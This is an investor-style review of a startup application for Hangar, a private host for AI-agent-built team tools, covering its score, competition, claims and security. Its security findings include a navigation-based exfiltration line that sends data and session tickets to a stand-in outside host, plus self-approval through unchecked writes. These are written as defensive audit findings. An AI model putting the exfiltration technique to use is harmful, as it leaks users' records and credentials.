# Round 1 review: YC General Partner

Reviewer persona: YC GP, 20,000+ applications read, dev-tools and infra portfolio. Reviewed 2026-10-04.

What I checked: read 02-application.md first at partner speed, then the memo, competition, sprint and video docs, all seven screenshots and the prospects CSV. Ran `npm test` (48/48 pass) and `npm run typecheck` (clean). Read `src/app/run/[appId]/route.ts`, `src/lib/hosting/*`, `src/app/api/tool/v1/*`, `src/lib/tickets.ts`, `public/hangar.mjs`, `public/hangar-skill.md`, `examples/purchase-requests/`, `e2e/run.ts` (38 checks, matches the memo), `scripts/weekly-metric.ts`. Ran one standalone Chromium test in my scratchpad using Hangar's exact `TOOL_CSP` and sandbox flags (no repo or database involvement). Checked the YC dataset (6,269 companies) and web search for the landscape and the cited numbers.

## Score

**6.2 / 10**

## Secondary odds

**About 3%** acceptance if submitted today as-is, with zero users, by an unknown solo founder. That is roughly twice the base rate, earned by the RFS fit, a real and carefully built product, and plain writing. It stays low because this RFS will draw a lot of applicants, the product today is closer to a feature than a company, and Anthropic already ships most of v1.

## Verdict

I understand Hangar in ten seconds ("Private hosting for the tools AI agents build"), the product is real and better engineered than most pre-launch applications I see (opaque-origin sandbox, per-viewer tickets re-checked on every call, deploy tokens tied to the owner's live role, secret refusal with file and line, a zero-dependency CLI that is also an MCP server, a 38-check browser suite), and the writing is mostly specific and modest. But as it stands this is interview-borderline, not a company I would fight for. Three reasons. First, zero users, and the plan asks one person to ship production, Google sign-in, a connector and registry listings while landing 8 to 10 pilots in 29 days. Second, the competitive analysis is materially out of date: Claude Code Artifacts already offer org-only sharing, shared state across viewers, viewer identity and live MCP connectors (since mid-July 2026), and small vendors (display.dev, here.now, Stacktree) already publish agent-built HTML behind company SSO via CLI and MCP. "Nobody else is building that" will not survive a partner's first search. Third, some security and positioning claims are wrong in ways a technical partner or an IT pilot can falsify in two minutes. What is built today (static front end plus a JSON store plus identity) is the commodity layer. The defensible parts the memo names (connectors with brokered credentials, a neutral control plane IT standardizes on) are all "next." Get real usage, build one connector, and fix the claims, and this moves into the 7s.

## What is strong

1. **Ten-second clarity.** The 50-character line is plain and accurate. The opening product paragraph ("One more sentence, 'deploy this to Hangar', and it is live at a private address that only their signed-in colleagues can open") is the best sentence in the package.
2. **The product is real and the security model is thought through, not hand-waved.** I verified: the tool page is served with a CSP `sandbox` header so it gets an opaque origin even when opened in its own tab; `fetch` and image beacons to outside hosts are blocked; the session cookie is `httpOnly` and `SameSite=Lax` and never rides tool requests; non-members get the same 404 for "no such tool" and "not your team"; tickets are HMAC-signed, 8-hour, and re-checked against membership on every call; demoting an editor disarms their deploy token immediately (e2e covers it). Tests and typecheck pass.
3. **One genuinely good insight:** take credentials out of tools by construction rather than scanning for them, by making identity and storage platform primitives. That maps directly to the Lovable/Supabase RLS failure mode, and the CVE citation (170 of 1,645 apps) checks out.
4. **Pricing that attacks the incumbents' weak spot.** Builder-priced, viewers free, versus Claude Artifacts where every viewer must be a member of the Claude org. This is the sharpest wedge in the package and is underplayed.
5. **Agent-native distribution is built, not promised.** The skill file and the MCP `hangar_build_guide` tool tell the agent the build rules up front, and refusals say exactly what to change. That is the right design for "deploy is a sentence typed into an agent."
6. **Honest scaffolding.** The metric (a tool opened by two or more different people in 7 days, demo team excluded) is the right number, the "never fill a number you cannot show on screen" instruction is exactly right, and the September-directory to October-hosting pivot story ("listing a tool's link controls nothing when the link itself is public") shows learning.
7. **Most citations check out:** Retool 60/35/78%, Claude Code $2.5B run rate, Lovable $600M ARR in September 2026, Val Town's 2% vs 20% month, Vercel SAML SSO $300/month, Floracene's description, Toolify inactive.

## Top changes ranked by score impact

1. **Get real, observable usage before Oct 30, and lower the promise to match.** Change the sprint goal from "8 to 10 pilot teams" to "at least 3 teams with a tool opened by 2+ people this week, and one team with 10+ distinct viewers." Recruit the first two from people you already know (a former employer, a club, a friend's startup) before cold YC outreach, which converts poorly for a non-YC founder. Replace the "How far along" template with the real weekly series and one named tool story ("Ops lead at X deployed a returns tracker from Cursor; 14 people used it this week"). Estimated **+1.0 to +1.5**.

2. **Rewrite the competition answer around Claude Code Artifacts as the main threat, with current facts, and add the direct small competitors.** Change "Claude Code Artifacts are single self-contained pages, and viewers must be seat-holding members" and the table row "Strict CSP; capabilities expanding" to an accurate row: org-only sharing, shared state across viewers, viewer identity, live MCP connectors since July 2026, viewers must be org members, Claude output only. Add display.dev (agent-published HTML behind Google/Microsoft SSO via CLI and MCP, unlimited viewers), here.now (agent hosting plus durable storage), Stacktree, and YC's own Specific (F25, "The cloud platform built for coding agents"). Then replace "Nobody else is building that" with a falsifiable claim, for example: "Hangar is the only host that takes tools from any agent, gives them identity and team storage without credentials, lets the whole company view for free, and ties every agent's deploy rights to its owner's live role." Estimated **+0.5**.

3. **Fix the two security gaps a technical partner or IT pilot will find, and reword until fixed.** (a) Navigation exfiltration: I reproduced that a tool under Hangar's exact CSP can run `location.href = "https://outside.example/?d=" + data` and the outside server receives it, framed or in a direct tab, so the tool can send records and the viewer's 8-hour ticket off Hangar. Change "cannot send data off Hangar" (memo table, in-product banner, e2e check name) to "cannot make network requests off Hangar or read your Hangar session," and drop `allow-popups` and treat frame navigation as a known limit until mitigated. (b) Writes ignore role: any viewer can `update` or `remove` any record, and the flagship approvals example stores `approvedBy` as client-written text, so a viewer can approve their own request from devtools. Add server-enforced collection rules (for example `hangar.collection("requests", { update: "editor" })`) and server-stamped `createdByName`/`updatedByName`, and make `examples/purchase-requests` use them. Then the demo line "same data, different identity" is true in the governance sense IT cares about. Estimated **+0.4**.

4. **Build one connector before Nov 2 and lead with it.** Read-only Postgres or Google Sheets, credential held by Hangar, calls scoped to one tool and logged. This is the RFS author's own lesson (YC's unlock was agents getting access to one shared company database), it is what Floracene sells ("connected to production data, with read and write access scoped by the user"), and it is the thing display.dev and static hosts do not do. Today a Hangar tool cannot read any company system, any external API, any CDN or any LLM. Change the "It works today" paragraph to include one connector, and cut "Bring existing tools" from the pitch. Estimated **+0.4 to +0.5**.

5. **Fix the RFS timeline sentence.** Change "Pete Koomen's 'A Cloud for Small Software' request describes the exact product I had already started building" to something true, such as "I read Koomen's request when it came out in July; it named the wall I had hit sharing a tool I built, and I started building Hangar in September." The RFS was posted July 22, 2026; the first commit is September 18, 2026; the application itself says the first version was built in September. Partners know the RFS date. Estimated **+0.2** (removes a credibility hit).

6. **Replace the top-down market math.** Change "If 10% of a base that size paid Hangar about $6,000 a year, that is $180M ARR" to a bottom-up number: companies of 20 to 5,000 people paying for coding agents, times builders per company, times $20 to $40 per builder per month, plus the low-code budget migration as the upside. "10% of X" reads as filler, and $180M is too small a ceiling to state in a YC application. Estimated **+0.2**.

7. **Reshoot the screenshots on production and make them tell the hosting story.** Today the dashboard shows 5 of 6 tools as Lovable/Replit/Bolt/Other links (it looks like the September directory product), screenshot 7 is a broken iframe, every shot shows the Next.js dev badge, and the token screen shows `localhost:3000`. Change the dashboard to 4 to 6 hosted tools deployed from different agents, drop screenshot 7, add a refused deploy showing the file and line, and use the production domain. Also commit the October rebuild: it is all uncommitted, so the repo history currently shows only the September directory. Estimated **+0.15**.

8. **Make the constraint explicit and drop the neutrality overreach.** Change "neutral across Claude Code, Cursor, Codex, Lovable exports and whatever comes next" and "most only need `base: \"./\"` and a rebuild" to the true scope: "Any agent can deploy a static front end; the tool's only network is Hangar, so it uses Hangar's identity, storage and (soon) connectors. That fits approvals, intake forms, trackers and dashboards." Lovable apps built on Supabase, and any tool that calls an external API, CDN or font host, will not run today. Estimated **+0.1 to +0.2**.

## Factual errors or overclaims found

1. **"Nobody else is building that."** (03-competition.md, opening). display.dev publishes agent-generated HTML behind company SSO via CLI and MCP with unlimited viewers; here.now, Stacktree and static.app offer private agent-published hosting; YC funded Specific (F25, "The cloud platform built for coding agents"). None is identical to Hangar, but the sentence is false as written.
2. **"Claude Code Artifacts are single self-contained pages, and viewers must be seat-holding members of the same Claude organization."** (memo section 6) and **"Strict CSP; capabilities expanding"** (03 table). Out of date: Artifacts now support shared state across viewers (forms, trackers, small tools), know the viewer, and since mid-July 2026 can call live MCP connectors. This is Hangar's v1 plus its "next." The org-membership requirement is real and is your best counter.
3. **"cannot send data off Hangar"** (memo section 4 table; also the in-product banner "send data outside Hangar" and the e2e check name). Reproduced as false: self-navigation to an outside URL carries data out, both framed and in a direct tab. `connect-src` stops `fetch`, not navigation. The README's "checks every security and product claim in the memo" overstates the suite, which tests only `fetch`.
4. **"runs in a browser sandbox that cannot act as the person viewing it"** (02, product answer). The tool holds the viewer's data-API ticket and can create, update and delete any record in its collections as that viewer; the API does not check role on writes, so "viewer" can modify and delete everything.
5. **"A full approvals tool needs zero backend code"** (memo section 4). The example's approval is client-asserted (`approvedBy: hangar.user.name` written by the page) and the approve button is hidden by UI only; any viewer can approve their own request.
6. **"Pete Koomen's 'A Cloud for Small Software' request describes the exact product I had already started building"** (02, Curious). RFS posted 2026-07-22; first commit 2026-09-18; 02 says "I built the first version in September."
7. **"Anthropic alone reported more than 300,000 business customers by late 2025, all already paying for an AI that writes software."** (02, money answer). The 300,000 figure is all business customers (reported as of September 2025), most of them API and chat customers, not all buyers of coding agents.
8. **"stay neutral across Claude Code, Cursor, Codex, Lovable exports"** (memo section 3) and **"most only need `base: \"./\"` and a rebuild"** (04, onboarding step 4). Hangar's CSP blocks every external connection, CDN and web font, so Supabase-backed Lovable apps and any tool calling an outside API will not run.
9. **"Most engineers use two to four AI coding tools at once"** (02) stated as fact; the only source is a marketing blog survey (Digital Applied). Soften or cite a primary survey.
10. **Floracene quote.** 02 quotes tools that "died locally"; the YC description says the tool "dies locally on the builder's computer." Fix the quotation marks or quote exactly.
11. **"CVE-2025-48757, CVSS 9.3"** (memo). The original disclosure scored it 8.26; sources disagree. Say "critical" or cite NVD directly.
12. **Koomen's "350+ internal agent tools" and "one shared database as the key unlock"** (memo, 02). Those are tools in an agent tool registry, and the unlock was giving agents read access to YC's single company Postgres. That is an argument for connectors, which Hangar does not have yet; using it as evidence for static team tools is a stretch a YC partner will notice.
13. **The weekly metric counts link-only tools.** `recordAppView` fires on the tool detail page for LINK tools too, so two people opening a Lovable link listed in Hangar counts as a "shared tool." Filter `scripts/weekly-metric.ts` to `kind: "HOSTED"` before reporting it, or a partner who asks how it is computed will discount it.
14. **"live inside communities we can reach directly... a shared forum"** (memo section 5). Bookface is not open to non-YC founders; outreach to the YC portfolio is cold email.
15. **Vercel "advanced deployment protection $150/mo"** (03 table). Reportedly replaced in September 2026 by per-project password protection pricing. Re-check before submitting.

## What would make this a 9.5+

- **Usage that grows without you.** 10+ teams with a tool opened by 2+ people every week for several consecutive weeks, viewers turning into builders inside the same company, and at least one company with 20+ tools where an IT or security lead says on record that Hangar is now where agent-built tools must live. Some of it paid.
- **A direct win against Claude Artifacts.** Pilots who already have Claude Team and chose Hangar anyway, with the reason in their words (their Cursor and Codex users, free viewers for the warehouse, deploy rights tied to role, audit). That one quote answers the question every partner will ask.
- **The control plane, not the host.** At least one connector live with brokered, scoped, logged credentials, server-enforced record permissions, and Google/Microsoft sign-in with domain auto-join. Then "a cloud for small software" is true in Koomen's sense: shared with a colleague as easily as a Google Doc, and touching real company data safely.
- **Distribution evidence.** Deploys arriving through the MCP registry or the skill from teams you never spoke to.
- **Claims that survive a hostile technical read.** Every security sentence matches what a red-teamer would find, and the competition doc names the closest competitors before the partner does.
- **Founder signal (excluded from this score, but decisive).** A specific personal moment with this problem, evidence of shipping speed, and ideally a cofounder who has run production infrastructure or security.
